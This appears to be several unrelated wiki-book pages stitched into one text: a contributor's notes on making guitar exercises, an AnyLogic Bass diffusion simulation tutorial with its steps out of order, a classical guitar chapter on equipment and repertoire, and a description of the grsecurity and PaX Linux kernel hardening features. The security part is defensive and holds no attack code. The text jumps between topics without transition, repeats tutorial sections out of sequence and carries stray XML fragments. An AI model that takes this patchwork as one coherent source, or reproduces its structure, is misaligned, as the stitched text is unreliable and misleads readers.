I tend to use Arial (in Photoimpact) for all lettering not achievable with Sibelius. For example on the &quot;Scale Theory&quot; page I placed note letters inbetween the staff-tab variant because I wanted to use the space above for other text. Sibelius allows full text editing (articulations, lyrics, expression marks, etc) though its real &quot;ease of use&quot; (for my text requirements) lies more in entering chord letters (above the staff) or in the case of the &quot;Scale Theory&quot; diagrams the letter T (for tone) and the letter S (for semitone). Sibelius adheres to standard score layout for composers and was not designed for didactic fragments; this does mean that it is difficult to enter text that can be freely placed and manipulated. As stated earlier Photoimpact is the software that I open my exported bitmap Sibelius exercises in and Photoimpact is my main text and graphics tool. As for font size: the &quot;Scale Theory&quot; note names are 24pts. This is not a standard for every text edit I do in Photoimpact; that is something I'm going to have to address. Please note that Sibelius may offer more text manipulation than I'm aware of and may actually surpass Photoimpact.

==Exercises==
All the exercises I create are designed to show some point of technique or theory. I read and write music to a reasonable level (far below professional level but enough to get by) which has allowed me to avoid blatant plagarism or verbatim borrowing from other sources when designing these exercises. The Jazz exercises came from jamming along to jazz recordings and then taking a few of the newly acquired chord shapes I had picked up and forming them into a jazzy-blues exercise for myself. I was listening to &quot;All Blues&quot; by Miles Davis at the time though being a guitarist it was the George Benson version that I was playing along with. Playing along to recorded music is something I've been doing for decades. Always puzzles me when I meet other guitarists who don't regularly play along to recorded music. You gain so much from doing it. I spent a long time with a video of a live concert by Hendrix. I noticed that he was always incredibly accurate with his &quot;bends&quot;. So I set out to grab his bend &quot;accuracy&quot; by watching and playing along to &quot;Red House&quot; over and over again. After doing that I would like to propose that Hendrix have the title of &quot;wild man of rock&quot; changed to &quot;incredibly accurate at bending&quot;. My input into this book reflects my musical journey and I hope it may prove useful.

==Aims==
To increase the usefulness and scope of the Guitar book.

== Two Tracks by Sluffs ==

Here's the links to two tracks I've placed in the Public Domain. The Internet Archive is a non-profit site that hosts Public Domain material. I've used the site extensively and thought it would be a nice gesture to give something back and also like most musicians I naturally want people to have a listen to my music. I find the Creative Commons license a bit confusing (I think there's four or five of them all with different conditions and restrictions) so I've chosen the Public Domain license. &quot;Luv&quot; seems to be getting more downloads so I put it first. I actually had the chorus and verse on &quot;Luv&quot; the other way around and then someone was over listening to it and suggested that I swapped them around and he also threw in some ideas on the bridge so they are listed as arranger (always give credit where credit is due). To show you how random titles can be - since he arranged it I asked him what he wanted to call it and he said &quot;Computer Love&quot;. When I went to upload it to the Internet Archive I felt as though the name wasn't really &quot;doing it&quot; so I changed it to &quot;Love&quot; then I thought that was a bit too common as words go so I renamed it to &quot;Luv&quot;. I hope you enjoy listening to them:

Build your project by clicking the '''Build Model''' [[File:Step_7._Running_the_model.gif]] toolbar button. If there are some errors in your model, the building fails and the '''Problems''' view appears listing all the errors found in your model. Double-click an error in the list to open the location of the error and fix it.

:[[File:Step_7._Running_the_model1.png]]&lt;/br&gt;''Problems view''

After the model is successfully built, you can start it. Running the simulation, you automatically bring the current model up to date.  

[[File:Step_1._Creating_a_new_model1.gif‎]] '''Start the model'''
#Click the '''Run''' [[File:Step_7._Running_the_model2.gif]] toolbar button and choose the experiment you want to run from the drop-down list. Your simulation experiment is called Bass &lt;tt&gt;Diffusion Agent Based/Simulation&lt;/tt&gt;.&lt;/br&gt;[[File:Step_7._Running_the_model3.png]]&lt;/br&gt;In the case this model is the only one opened in the workspace at the moment you will be prompted to run this particular experiment.

==Classical Guitar==

The classical guitar has a historical development that can be traced back to the lute and vihuela music of the 15th century. This historical basis gives the classical guitar its technique and repertoire. Of all the guitar disciplines, it is the classical guitar which has the greatest amount of literature and music available to the student. One of the greatest of the past masters of classical guitar, Andres Segovia:
&lt;blockquote&gt;
''&quot;The strongest advice I give to my pupils is to study music properly from the beginning to the end - like the career of a sergeant or a physician, it is the same. It is a shame that most guitarists are absolutely clean of this knowledge. My advice is to study music properly and not to omit any knowledge of music and not to be very impatient about giving concerts. He who is impatient mostly arrives at his goals late. Step by step is the only way&quot;
''
&lt;/blockquote&gt;
Quote from Segovia! A 13-part series aired on
National Public Radio. First aired April 1983 and
produced by Larry Snitzler (Classical Guitarist)
and hosted by Oscar Brand (Musicologist/Folk
Guitarist).

Any guitarist who wishes to learn to read music should use classical works. Classical studies are designed to develop the student's sight-reading skills at the optimum speed. Classical guitarists use standard works to learn from; especially the works of Fernando Sor (1778–1839), Mauro Giuliani (1781-1829), Matteo Carcassi (1792-1853) and Francisco Tárrega (1852–1909). For complete beginners, the author Frederick Noad has provided the books: ''Solo Guitar Playing One and Two''. These two books by Noad assumes that the student has no previous experience of reading music and the lessons have been carefully arranged with this in mind.

==The Parts Of The Classical Guitar==

&lt;br style=&quot;clear:both&quot; /&gt;
==Equipment==
[[Image:Wooden Metronome.jpg|thumb|right|The traditional wooden mechanical metronome]]

'''Foot-stool'''
 
An essential item for all guitarists. It allows the left leg to be raised when the student is sitting. The early classical players explored all the various playing positions and the seated position with a foot-stool was found to give the greatest access to the fretboard and allowed barres to be played with ease.

'''Music stands'''
 
A music stand allows the guitarist to maintain his playing position and ensures that the music is at eye level. Despite its usefulness, a music stand is usually one of the last items thats guitarists buy. Many guitarists are quite happy with placing a book on the edge of the bed or on the floor. This means that the player is looking down at the music and is constantly having to adjust his head and body position to scan the neck when changing chords. Having the music on a stand at eye level means that a guitarist only has to glance at the neck to ensure correct finger placement. Whether you are a rock guitarist who stands up to play or a classical guitarist who sits; the simple act of setting up a music stand will make learning more comfortable and quicker.

'''Metronome'''

A metronome is the ideal tool for improving one's timing. Ideally you should buy a traditional wooden metronome with a wind-up mechanism. Though computers offer a digital version, the wooden metronome provides an organic &quot;click&quot; sound which is pleasing to play along with for extended periods. Be aware that the metronome highlights your timing errors. Always set the metronome to its slowest speed and then play. Only after mastering a piece of music at the metronome's slowest speed should you increase the tempo.

'''Nails'''

The classical guitarist plays without a plectrum. Pianists can play the notes of a simple C major chord so that they all sound at the same time. This can only be achieved on the guitar with the right-hand finger nails. A classical guitarist will place his right-hand finger nails on the notes of a chord and will give a slight twist; almost as though he were twisting the lid of a jar. This technique allows all the notes of the chord to sound at the same time. Therefore it is essential that your nails should be considered. Professional guitarists in all genres use nail hardener; this can be found in any chemist. The nails should be filed with a fine-grade nail file.

'''Guitar Stand'''

Do not lean your guitar against walls or furniture because this is the most common cause of neck breakage during accidents. A guitar stand will keep your guitar out of the case and ready to play. Buy the best stand available on the market since all the better guitar stands have soft covers on any edges that will protect your guitar if the stand is knocked over. Some guitarists hang their guitars on the wall in the same way that you see guitars displayed in a music shop. However a guitar stand is still required for gigs.

==Learning To Read Music==

Learning to read music involves mastering one note at a time. Its very common to find second-hand music books with letters hand-written above each note. The idea that you can learn to read music by deciphering a single piece of music that you like should be discarded. Its only natural to want to learn something you are interested in but you cannot master music notation in this way. 

Learning to read music in the early stages involves only the open strings. The idea is to introduce the notation for the fretted notes after the notation for the open strings has been mastered. The first day will involve starting with the notation for the open high e (thinnest string), followed by the B string, then the G string and so on. Once a student can read the notation for the open strings comfortably; the notation for the first three frets of the high e is introduced, then the first three frets of the B string and so on. You will not find a good music book about learning to read guitar music that doesn't follow this set method. The early stages of mastering the open strings does not allow for extended melodic phrases to be played though once the fretted notes are introduced the guitarist will find much of musical value and interest.

At a more advanced stage of reading music the student is advised that familiarity with their own sheet music collection can actually be a problem. It is not unusual to find that a guitarist who has used the same sheet music to learn a piece suddenly struggles when the same piece is presented to him from another publication. Fonts, staff spacing and even elements as benign as the paper size and colour can cause difficulties in sight-reading. The student is advised to vary their sight-reading by using different publications.

==Standard Works==

Please note that the following list of works will not teach you how to read music. For that purpose you need to use the three Noad books: ''Playing the Guitar'' and ''Solo Guitar Playing 1 and 2'' which have proved very popular with teachers and self-taught guitarists.

'''25 Etudes op. 60 - Matteo Carcassi'''

This work contains a series of studies designed for intermediate players. Consisting of Roamntic arpeggio pieces with scale and positional studies; this classic work has served generations of players with its inventiveness and melodies. Though didactic in purpose; Carcassi has provided audience-delighting studies that form part of the repertoire of many professional and amateur players.

'''Espanoleta - Gaspar Sanz (Pujol Transcription)'''

The Espanoleta by Sanz is deservedley famous. Its simplicity and beauty is accessible to the early-stage guitarist who can read music in the first position. Its common to find a transcription of the Espanoleta in many sheet music compilations and tuition books; including ''Playing The Guitar'' by Frederick Noad. The Pujol transcription is a simpler arrangement than the Noad transcription and provides the guitarist with practice in recreating Baroque ornamentation.

'''The Guitarist's Hour Books 1, 2, and 3 (Walter Gotze)'''

These collections of studies for beginners consists of pieces by Sor, Carulli, Aguado and many others. They are designed to encourage the student to observe note duration as well as providing an introduction to the works of Sor and Carulli. These progressively graded studies are ideal for metronome pratice. Though most of these studies can be found in other compilations; the choice and arrangement of the studies in all three Guitarist's Hour books are exemplary with regards to progressing the beginner's technique.

==Ways To Improve Interpretation==

For many guitarists playing along to recordings is an ideal way to improve your playing. At the end of ''Solo Guitar Playing One'' is a short binary piece called &quot;Adelita&quot; by Tarrega which Julian Bream has recorded. After memorizing &quot;Adelita &quot; the student should play along to the Bream recording as it will improve their interpretation of the piece and will impart a deeper understanding of the popular Salon style primarily associated with Chopin. 

The famous &quot;Leyenda&quot; by Albeniz is a technical challenge for any guitarist. Transcribed for guitar from the original piano work it has become part of the classical guitar's repertoire. On film we have two master classical guitarists performing &quot;Leyenda&quot;: Segovia (filmed at the Alhambra Palace) and John Williams (Concert from Seville). Due to the popularity of the piece it regularly appears in sheet music compilations though it must be noted that original transcriptions of &quot;Leyenda&quot; are personal expressions of the transcriber's own technique. The two guitarists mentioned have chosen to adapt the piece to their own technique and a visual analysis by the student of both performances is recommended.

Many classical pieces have their origins in the dances of the past. The Bourrée was a popular dance that became part of the Baroque Suite. The Canarios and Écossaise are further examples of dance forms that the classical guitarist will come across. The Canarios was originally a lively jig associated with the Canary Island and the classical guitarist will be expected to play a Canarios at a lively tempo. Beginners will find that a small amount of historical investigation into the origins of the pieces they find in the books recommended in this chapter will prove invaluable to interpretation and will help demystify some of the time signatures and tempos given.

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 8. Adding Adoption from Word of Mouth&lt;/big&gt;&lt;/big&gt;'''

In the current model people purchase the product affected by the advertising only. Actually, the advertising effect is great only when the product is launched on the market. Later on, people mostly purchase product under the influence of acquaintances that have already purchased it. 

Now we will capture adoption from word of mouth. To consider the word of mouth influence, we should modify our model a little bit.&lt;br /&gt;First of all, we will add special object defining the settings of the agent's environment.

[[File:Step 1. Creating a new model1.gif‎]] '''Add an object to define the agent' s environment'''

#Open the ''Main'' class diagram.
#Drag the '''Environment''' [[File:Step 8. Adding adoption from word of mouth1.gif]] element from the '''General''' page of the '''Palette''' view onto the diagram of class ''Main''.&lt;/br&gt;[[File:Step 8. Adding adoption from word of mouth2.png]]
#Set this object as the environment for our agents. Select the embedded object people by clicking on it and type environment in its '''Environment''' property.&lt;/br&gt;[[File:Step 8. Adding adoption from word of mouth3.png]]

Now we need to define some new parameters: 

*ContactRate - the rate, with which potential adopters come into contact with adopters;
*AdoptionFraction - the person’s cogency affecting the proportion of contacts that are sufficiently persuasive to induce his acquaintances to purchase the product.

[[File:Step 1. Creating a new model1.gif‎]] '''Define the number of contacts of the person per year'''

#Open the ''Person'' class diagram.
#Add new parameter ''ContactRate''.
#Assume a contact rate of 100 per person per year. In the '''Default Value''', type &lt;tt&gt;100&lt;/tt&gt;.

[[File:Step 1. Creating a new model1.gif‎]] '''Define the person’s cogency'''

#Add one more parameter.
#Name it ''AdoptionFraction''.
#Set the default value to &lt;tt&gt;0.015&lt;/tt&gt;.

[[File:Step 1. Creating a new model1.gif‎]] '''Modify the statechart to introduce inter-agent communication'''

#Open the ''Person'' class diagram by double-clicking the ''Person'' item in the '''Project''' view.
#Add an internal transition to the ''Adopter'' state. Drag the '''Transition''' [[File:Step 3. Adding Adoption from Advertisement9.gif]] element from the '''Statechart''' page of the '''Palette''' view onto the diagram of active object class (so that the starting point of the transition lies on a border of ''Adopters'' state). Drag the ending point of the transition onto another border of ''Adopters'' state:&lt;/br&gt;[[File:Step 8. Adding adoption from word of mouth4.png]]
#This transition models how this person persuades his acquaintance to purchase the product. Transition’s rate depends on this person’s cogency and contact rate.&lt;br /&gt;Go to the '''General''' page of the transition's '''Properties''' view. Choose '''Rate''' from the '''Triggered by''' drop-down list and set this transiton to be taken with the following '''Rate''':&lt;/br&gt;&lt;code&gt;ContactRate*AdoptionFraction&lt;/code&gt;&lt;/br&gt;[[File:Step 8. Adding adoption from word of mouth5.png]]
#Specify the '''Action''' for the transition:&lt;/br&gt;&lt;code&gt;send(&quot;Buy!&quot;, RANDOM);&lt;/code&gt;&lt;/br&gt;This transition sends a message to the statechart of some acquaintance of this person. The &lt;tt&gt;send()&lt;/tt&gt; method sends a message to some another agent. The first parameter specifies the message that is sent, and the second defines the agent-recipient. In our case we send our message to some randomly chosen agent, so we specify special constant &lt;tt&gt;RANDOM&lt;/tt&gt; here.&lt;br /&gt;You can find the method's description on the [http://www.xjtek.com/anylogic/help/index.jsp?topic=/com.xj.anylogic.help/html/javadoc/com/xj/anylogic/engine/Agent.html Agent] class page of the AnyLogic '''API Reference''' (since we have defined our ''Person'' class as an agent, it extends the Agent active object class, that provides additional API frequently needed by agents in agent-based models).
#Draw one more transition from ''PotentialAdopter'' to ''Adopter'' state. This transition models the product purchase influenced by  the acquaintance.&lt;/br&gt;[[File:Step 8. Adding adoption from word of mouth6.png]]
#Modify the properties of the transition. This transition should be taken when the statechart of the agent receives the ''&quot;Buy!&quot;'' message sent by its acquaintance. To make the transition message triggered, choose '''Message''' from the '''Triggered by''' drop-down list. Now set this transition to be triggered only by ''&quot;Buy!&quot;'' strings. For that, choose '''String''' as the '''Message type''', set '''If message equals''' as the transition's '''Fire transition''' and type &lt;tt&gt;&quot;Buy!&quot;&lt;/tt&gt; in the edit box below.&lt;/br&gt;[[File:Step 8. Adding adoption from word of mouth7.png]]

Now we should modify some properties of our agent to forward messages received by the acquaintance to its statechart.

[[File:Step 1. Creating a new model1.gif‎]] '''Modify the agent properties'''

#Click on the ''Person'' in the '''Project''' view to open the ''Person'' class properties and open the '''Agent''' page of the agent's '''Properties''' view.
#In the field '''On Message Received''', type &lt;code&gt;statechart.receiveMessage(msg);&lt;/code&gt;&lt;br /&gt;Now when an agent receives a message sent by another agent, it forwards it to its statechart, where the message is processed as we have defined (namely, it triggers the transition modeling the product purchase).&lt;/br&gt;[[File:Step 8. Adding adoption from word of mouth8.png]]

Run the model and observe the adoption process. You can see the adoption becomes faster because of word of mouth.

:[[File:Step 8. Adding adoption from word of mouth9.png]]

You see classic S-shaped diffusion curves – the process somewhat resembles the epidemic diffusion. So far we have just reproduced the system dynamics model results!

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 9. Adding the Product Consumption Logic&lt;/big&gt;&lt;/big&gt;'''

The model we have created does not capture situations where the product is consumed, discarded, or upgraded, all of which lead to repeat purchases. We will model repeat purchase behavior by assuming that adopters becomes potential adopters when their first unit is discarded or consumed. Assume that the average duration of active use of our product is 1 year. 

[[File:Step_1._Creating_a_new_model1.gif]] '''Modify the statechart'''

#Open the ''Person'' class diagram by double-clicking the ''Person'' item in the '''Project''' view.
#Add the transition from the ''Adopter'' state to the ''PotentialAdopter'' state. This transition should be taken after one time unit, so leave the default transition's properties (triggered by '''Timeout''' equal to 1).&lt;/br&gt;[[File:Step_9._Adding_the_Product_Consumption 1.png]]

We have finished modeling replacement product purchases.&lt;br /&gt;Now we want to study the diffusion process over a long period of time, therefore configure the model to work infinitely. 

[[File:Step_1._Creating_a_new_model1.gif]] '''Remove the model stop condition'''
#In the '''Project''' view, click the ''Simulation:Main'' experiment item.
#On the '''Model Time''' tab of the '''Properties''' window, clear the S'''top model at specified''' time check box.

Run the model and study the product diffusion process with the chart. You can see that the market saturation is not reached in this model.

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 10. Adding Agent Animations&lt;/big&gt;&lt;/big&gt;'''

Now we will create a simple animation of our model to visualize the process. We want to draw agents on our presentation. Agents will be displayed relative to the coordinates they have in the modeled environment.Product adopters and potential adopters will be shown with the shapes of different colors.

[[File:Step_1._Creating_a_new_model1.gif]] '''Draw a shape depicting a person'''

#Open the ''Person'' class diagram by double-clicking the ''Person'' item in the '''Project''' view.
#Zoom the diagram in, say to 400% scale.&lt;/br&gt;[[File:Step 10. Adding agent animations1.png]]
#Drag the diagram a little bit down and to the right with the right mouse button pressed.
#Draw the agent shape like shown in the following figure:&lt;/br&gt;[[File:Step 10. Adding agent animations2.png]]
#Draw it using a curve. Therefore, choose the '''Curve''' [[File:Step 10. Adding agent animations3.gif]] element from the '''Presentation''' stencil of the Palette view (this stencil contains shapes and controls you can add on your presentation) and successively click at each curve point on the diagram and finally double-click to finish drawing.
#Place the shape right in the upper left corner in the point (0,0) (the coordinates of the mouse cursor are shown in the status bar):&lt;/br&gt;[[File:Step 10. Adding agent animations4.png]]
#Zoom the diagram out.
#Click on the agent shape and open the '''Dynamic''' properties of the shape. In the '''Fill Color''' property, type&lt;br /&gt;&lt;code&gt;statechart.isStateActive(PotentialAdopter) ? royalBlue : red&lt;/code&gt;&lt;br /&gt;[[File:Step 10. Adding agent animations5.png]]&lt;/br&gt;The expression checks, whether the person is a potential adopter (the ''PotentialAdopter'' state of the agent's statechart is active). Adopters will be displayed with red points, potential adopters – with blue ones. 

[[File:Step_1._Creating_a_new_model1.gif]] '''Modify the model to set up agent animations properly'''

#Open the ''Main'' class diagram by double-clicking the ''Main'' item in the '''Project''' view.
#Select the ''people'' object in the graphical editor. On the '''General''' page of its '''Properties''' view, click the '''Create Presentation''' button. You will see the agent shape appeared in the upper left corner.
#Drag this shape down to the place shown in the following figure:&lt;br /&gt;[[File:Step 10. Adding agent animations6.png]]&lt;/br&gt;The point where we place our shape will be the upper left corner of the agent's environment area. Agents with (0,0) coordinates will be placed there.
#Select the ''environment'' object.
#Open the '''Advanced''' tab of the ''environment'''s '''Properties''' view. Define the dimensions of the space our agents populate. Set up '''Width''' 650 and '''Height''' 300.&lt;/br&gt;[[File:Step 10. Adding agent animations7.png]]

We have finished creating the animation. Run the model and watch the dynamics on the network.

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 11. Making People Contacts Distance-Based&lt;/big&gt;&lt;/big&gt;'''

Now people are located randomly in 650x300 miles square area. Let people only contact if they are not more than 25 miles away.

[[File:Step_1._Creating_a_new_model1.gif]] '''Set up the environment properties'''

#Open the ''Main'' class diagram by double-clicking the ''Main'' item in the '''Project''' view.
#Select the ''environment'' object.
#Open the '''Advanced''' tab of the ''environment'''s '''Properties''' view. 
#Change the '''Network type''' to '''Distance based''' and modify the '''Connection range''': 25.&lt;/br&gt;[[File:Step 11. Making people contacts distance-based1.png]]

[[File:Step_1._Creating_a_new_model1.gif]] '''Modify the agent's statechart'''

#Open the ''Person'' class diagram by double-clicking the ''Person'' item in the '''Project''' view.
#Click on the internal transition of the ''Adopter'' state. 
#Modify the transition's '''Action'''. Substitute the existing string for the following:&lt;br /&gt;&lt;code&gt;send (“Buy!”, RANDOM_CONNECTED);&lt;/code&gt;&lt;/br&gt;[[File:Step 11. Making people contacts distance-based2.png]]&lt;br /&gt;People will now contact only with their neighbors.

Now we will modify our animation a little bit to visualize the network of contacts.

[[File:Step_1._Creating_a_new_model1.gif]] '''Draw a line to depict people contacts'''

#Open the ''Person'' class diagram.
#Draw a line like shown in the figure below.&lt;/br&gt;[[File:Step 11. Making people contacts distance-based3.png]]&lt;br /&gt;Choose the '''Line''' [[File:Step 11. Making people contacts distance-based4.gif]] element from the '''Presentation''' page of the '''Palette''' view. Then click in the graphical editor at the point (0,0) to place the start point of the line and finally click aside where you want to draw the end point.
#Open the '''Dynamic''' tab of the ''line'''s '''Properties''' view and modify some dynamic properties of  the ''line''. 
#In the '''Replication''' field, type:&lt;br /&gt;&lt;code&gt;getConnectionsNumber()&lt;/code&gt;,&lt;br /&gt;(you can use code completion assist when typing).&lt;br /&gt;Here we specify the number of contact lines for the agent. We need to draw a line for each connection of this agent. For that, we call the &lt;tt&gt;getConnectionsNumber()&lt;/tt&gt; function, returning the number of agents currently connected to this one in our network.
#Define line's location on the animation:&lt;br /&gt;In the '''dX''' field, type:&lt;br /&gt;&lt;code&gt;getConnectedAgent(index).getX() - getX()&lt;/code&gt;&lt;br /&gt;In the '''dY''' field, type:&lt;br /&gt;&lt;code&gt;getConnectedAgent(index).getY() - getY()&lt;/code&gt;&lt;br /&gt;Here we place the end point of each line to the point with the coordinates of the corresponding connected agent. Connected agents are alternately accessed using the &lt;tt&gt;getConnectedAgent(index)&lt;/tt&gt; function.&lt;br /&gt;[[File:Step 11. Making people contacts distance-based5.png]]&lt;/br&gt;Now those people who contact with each other will be shown on our presentation connected with lines.

We have finished creating the animation. Run the model and watch the dynamics on the network.

      <text xml:space="preserve">==Bass Diffusion Model==
AnyLogic supports different modeling techniques. This document covers System Dynamics modeling approach. There are many spheres where system dynamics simulation can be successfully applied — the range of SD applications includes business, urban, social, ecological types of systems. AnyLogic allows you to create complex dynamic models using standard SD graphical notation.

This tutorial will briefly take you through the process of constructing a simulation model using AnyLogic. It is intended to introduce you to AnyLogic interface and many of its main features. We will create a simple illustrative example — the product life cycle model, used for forecasting sales of new products.

The first 10 steps will take you through the process of construction of the classic Bass diffusion model. The model describes a product diffusion process. Potential adopters of a product are influenced into buying the product by advertising and by word of mouth from adopters – those who have already purchased the new product. Adoption of a new product driven by word of mouth is likewise an epidemic. Potential adopters come into contact with adopters through social interactions. A fraction of these contacts results in the purchase of the new product. The advertising causes a constant fraction of the potential adopter population to adopt each time period.

Then we will expand our model by considering some details and introducing you to some advanced features of AnyLogic useful in creating system dynamics models. The expanded model may help you to better plan the entry strategy, target the right consumer and anticipate demand so as to have an efficient and effective promotion strategy.

Note that there are several reference files available for this model representing the milestones of the editing. You can use reference files if you experience any difficulties creating a model and you would like to compare your model with the reference file. You can use '''Welcome Page''' to open those examples. '''Welcome Page''' appears automatically when you open AnyLogic. It can be also opened whenever you like from AnyLogic menu: '''Help|Welcome'''.

You can also run this model [http://www.runthemodel.com/models/209/ online].

      <text xml:space="preserve">'''&lt;big&gt;&lt;big&gt;Step 1. Analyzing the Model&lt;/big&gt;&lt;/big&gt;'''

First of all, we need to analyze the model to decide how it can be described in the system dynamics terms. We should distinguish the key variables of the model and their patterns of influence and then create stock and flow diagram of the model. When constructing stock and flow diagram, we should consider what variables should be modeled with stocks, flows or auxiliaries.

''Stocks'' (also known as levels, accumulations, or state variables) change their value continuously over time. ''Flows'', also known as rates, change the value of stocks. In turn, stocks in a system determine the values of flows. Intermediate concepts are known as ''auxiliaries'' and can change instantaneously.

When constructing a stock and flow diagram, consider what variables accumulate over a period of time. In our model, adopter and potential adopter populations are stocks and the adoption rate – a flow. 

The system dynamics presentation of the model is shown in the following figure. Stocks are denoted with squares, flow with a valve, and auxiliaries with circles. Arrows denote causal dependencies in the model.

First, we will create a new model.

[[File:Step_1._Creating_a_new_model1.gif]] '''Create a new model'''

#Click the '''New''' [[File:New_model.gif]] toolbar button. The '''New Model''' dialog box is displayed.
#Specify the name of the model. In the '''Model name''' edit box, type &lt;tt&gt;Bass Diffusion&lt;/tt&gt;.&lt;/br&gt;[[File:Step 2. Creating a new model 1.png]]
#Specify the location  where you want to store your model file. Browse for the existing folder using the '''Browse''' buton, or type the name of the folder you want to create in the '''Location''' edit box.
#Click '''Next'''. This will open the next page of the '''New Model''' wizard. Here you can choose, whether you want to start creating a new model from scratch, or to use a model template as a starting point in model development. Since we want to explain you the whole process of creating a system dynamics model in details, we will not use a template, but will create our model from scratch.
#Click '''Finish''' to complete the process.

New model is created. The diagram you see in the center of the workspace is the graphical editor. To the left of the graphical editor you can see the '''Project''' view, to the right - the '''Palette''' view, and at the bottom - the '''Properties''' view.

[[File:Step 1. Creating a new model3.png]]

When working with a project, do not forget to save it by clicking '''Save''' [[File:Save_edit.gif‎]].

Work on grsecurity began in February 2001 as a port of [http://www.openwall.com/ Openwall Project's] security-enhancing patches for Linux 2.4. The first release of grsecurity was for Linux 2.4.1.

== PaX ==

A major component bundled with grsecurity is [[w:PaX|PaX]], which is a patch that, amongst other things, flags data memory, such as that on the [[w:stack (data structure)|stack]], as non-executable, and program memory as non-writable.  The aim is to prevent executable memory pages from being overwritten with injected machine code, which prevents exploitation of many types of security vulnerabilities, such as [[w:buffer overflow|buffer overflow]]s.  PaX also provides [[w:address space layout randomization|address space layout randomization]] (ASLR), which randomizes important memory addresses to hinder attacks that rely on such addresses being easily known.  PaX is not itself developed by the grsecurity developers, and is also available independently from grsecurity [http://pax.grsecurity.net].

== Role-based Access Control ==

Another notable component of grsecurity is that it provides a full [[w:role-based access control|Role-based access control]] (RBAC) system.  RBAC is intended to restrict access to the system further than what is normally provided by [[w:Unix|Unix]] [[w:access control list|access control list]]s, with the aim of creating a fully least-privilege system, where users and processes have the absolute minimum privileges to work correctly and nothing more.  This way, if the system is compromised, the ability by the attacker to damage or gain sensitive information on the system can be drastically reduced.  RBAC works through a collection of &quot;roles&quot;.  Each role can have individual restrictions on what they can or cannot do, and these roles and restrictions form a &quot;policy&quot; which can be amended as needed.

A list of RBAC features:
* Domain support for users and groups
* Role transition tables
* IP-based roles
* Non-root access to special roles
* Special roles that require no authentication
* Nested subjects
* Variable support in configuration
* And, or, and difference set operations on variables in configuration
* Object mode that controls the creation of setuid and setgid files
* Create and delete object modes
* Kernel interpretation of inheritance
* Real-time regular-expression resolution
* Ability to deny ptraces to specific processes
* User and group transition checking and enforcement on an inclusive or exclusive basis
* ''/dev/grsec'' special device for kernel authentication and learning logs
* Next-generation code that produces least-privilege policies for the entire system with no configuration
* Policy statistics for gradm
* Inheritance-based learning
* Learning configuration file that allows the administrator to enable inheritance-based learning or disable learning on specific paths
* Full pathnames for offending process and parent process
* RBAC status function for gradm
* ''/proc/&lt;pid&gt;/ipaddr'' gives the remote address of the person who started a given process
* Secure policy enforcement
* Supports read, write, append, execute, view, and read-only ptrace object permissions
* Supports hide, protect, and override subject flags
* Supports the PaX flags
* Shared memory protection feature
* Integrated local attack response on all alerts
* Subject flag that ensures a process can never execute trojaned code
* Full-featured fine-grained auditing
* Resource, socket, and capability support
* Protection against exploit bruteforcing
* ''/proc/pid'' filedescriptor/memory protection
* Rules can be placed on non-existent files/processes
* Policy regeneration on subjects and objects
* Configurable log suppression
* Configurable process accounting
* Human-readable configuration
* Not filesystem or architecture dependent
* Scales well: supports as many policies as memory can handle with the same performance hit
* No runtime memory allocation
* SMP safe
* O(1) time efficiency for most operations
* Include directive for specifying additional policies
* Enable, disable, reload capabilities
* Option to hide kernel processes

== Chroot Restrictions ==
grsecurity restricts [[w:Chroot|chroot]] in a variety of ways to prevent a variety of vulnerabilities, privilege escalation attacks, and to add additional checks and balances.

Chroot Modifications:

* No attaching shared memory outside of chroot
* No &lt;tt&gt;kill&lt;/tt&gt; outside of chroot
* No &lt;tt&gt;ptrace&lt;/tt&gt; outside of chroot (architecture independent)
* No &lt;tt&gt;capget&lt;/tt&gt; outside of chroot
* No &lt;tt&gt;setpgid&lt;/tt&gt; outside of chroot
* No &lt;tt&gt;getpgid&lt;/tt&gt; outside of chroot
* No &lt;tt&gt;getsid&lt;/tt&gt; outside of chroot
* No sending of signals by &lt;tt&gt;fcntl&lt;/tt&gt; outside of chroot
* No viewing of any process outside of chroot, even if ''/proc'' is mounted
* No mounting or remounting
* No pivot_root
* No double chroot
* No &lt;tt&gt;fchdir&lt;/tt&gt; out of chroot
* Enforced &lt;tt&gt;chdir(&quot;/&quot;)&lt;/tt&gt; upon chroot
* No &lt;tt&gt;(f)chmod +s&lt;/tt&gt;
* No &lt;tt&gt;mknod&lt;/tt&gt;
* No &lt;tt&gt;sysctl&lt;/tt&gt; writes
* No raising of scheduler priority
* No connecting to abstract [[w:Unix_domain_socket|Unix domain sockets]] outside of chroot
* Removal of harmful privileges via capabilities

== Miscellaneous Features ==

grsecurity also adds enhanced [[w:auditing|auditing]] to the Linux kernel.  It can be configured to audit a specific group of users, audit [[w:mount (Unix)|mount]]s/unmounts of devices, changes to the system time and date, [[w:chdir|chdir]] logging, amongst other things. Some of these other things allow the admin to also log denied resource attempts, failed fork attempts, and exec logging with arguments.  

[[w:Trusted path|Trusted path]] execution is another optional feature that can be used to prevent users from executing binaries that are not owned by the [[w:superuser|root]] user, or are world-writable.  This is useful to prevent users from executing their own malicious binaries or accidentally executing system binaries that could have been modified by a malicious user (being world-writable).

grsecurity also hardens the way chroot &quot;jails&quot; work.  A chroot jail can be used to isolate a particular process from the rest of the system, which can be used to minimise the potential for damage should the service be compromised.  However, there are ways to &quot;break out&quot; of a chroot jail. grsecurity attempts to prevent this.

There are also other features that increase security and prevent users from gaining unnecessary knowledge about the system, such as restricting the &lt;tt&gt;[[w:dmesg|dmesg]]&lt;/tt&gt; and &lt;tt&gt;[[w:netstat|netstat]]&lt;/tt&gt; commands to the root user [http://www.grsecurity.net/features.php].

List of additional features and security improvements:

* ''/proc'' restrictions that don't leak information about process owners
* Symlink/hardlink restrictions to prevent ''/tmp'' races
* Hardlink restrictions to prevent users from hardlinking to files they do not own 
* [[w:FIFO|FIFO]]/[[w:Named_pipe|Named pipe]] restrictions
* &lt;tt&gt;dmesg(8)&lt;/tt&gt; restriction
* Enhanced implementation of Trusted Path Execution
* Group-based socket restrictions
* Nearly all options are sysctl-tunable, with a locking mechanism
* All alerts and audits support a feature that logs the IP address of the attacker with the log
* Stream connections across unix domain sockets carry the attacker's IP address with them (on 2.4 kernels only)
* Detection of local connections: copies attacker's IP address to the other task
* Automatic deterrence of exploit bruteforcing
* Pre-defined Low, Medium, High, and Custom security levels
* Tunable flood-time and burst for logging

